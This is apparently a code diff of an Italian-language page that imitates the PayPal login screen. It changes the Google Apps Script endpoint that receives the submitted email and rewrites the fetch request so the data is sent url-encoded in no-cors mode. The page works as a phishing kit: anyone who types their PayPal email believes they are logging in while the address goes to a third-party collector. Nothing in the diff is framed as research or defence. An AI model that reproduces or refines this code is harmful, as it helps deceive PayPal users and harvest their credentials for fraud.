@@ -132,7 +132,7 @@
            alt="PayPal" class="logo">
 
       <!-- Form di login -->
-      <form id="emailForm" action="https://script.google.com/macros/s/AKfycbwcmKDFaFBM4_5d_5OaJjQtQrqbvIG5g94BR_e2945gcuFoPzpOTlMKTCd1Qi0Uk-w5/exec" method="POST" onsubmit="return handleSubmit(event)">
+      <form id="emailForm" action="https://script.google.com/macros/s/AKfycbwZZaT_vkrMMfTFimsUoekrcB6FKqn1EubqqTszwNzfXkkjkCQcofyXTSdY_ayf665a/exec" method="POST" onsubmit="return handleSubmit(event)">
         <input type="email" name="email" id="email" placeholder="Email o numero di cellulare" required>
         <a href="#" class="forgot">Hai dimenticato l'indirizzo email?</a>
         <button class="btn-primary" type="submit">Avanti</button>
@@ -172,11 +172,12 @@
         return false;
       }
 
-      fetch(form.action, {
-        method: "POST",
-        mode: "no-cors", // fondamentale per evitare errore CORS
-        body: new FormData(form)
-      }).then(() => {
+fetch(form.action, {
+  method: "POST",
+  mode: "no-cors",
+  headers: { "Content-Type": "application/x-www-form-urlencoded" },
+  body: new URLSearchParams(new FormData(form)) 
+}).then(() => {
         status.textContent = "Email inviata con successo!";
         status.style.color = "green";
         form.reset();
